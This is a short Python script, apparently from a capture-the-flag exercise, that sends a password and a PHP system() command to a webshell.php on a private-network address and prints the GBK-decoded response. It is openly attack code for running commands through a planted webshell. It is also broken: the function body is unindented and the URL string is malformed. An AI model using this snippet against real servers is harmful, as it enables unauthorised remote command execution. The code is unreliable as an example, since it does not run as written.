#-*-coding:utf-8-*-
def atta(i):
import requests
payload = {'passwd':'i4mhmh!','a':'system("hereiam");'}
u = 'http://192.168.'+46.99'/webshell.php'  
r = requests.post(url=u,data=payload)
html=r.text.encode('latin1').decode('gbk')
print(html)
'''成功解决乱码问题'''
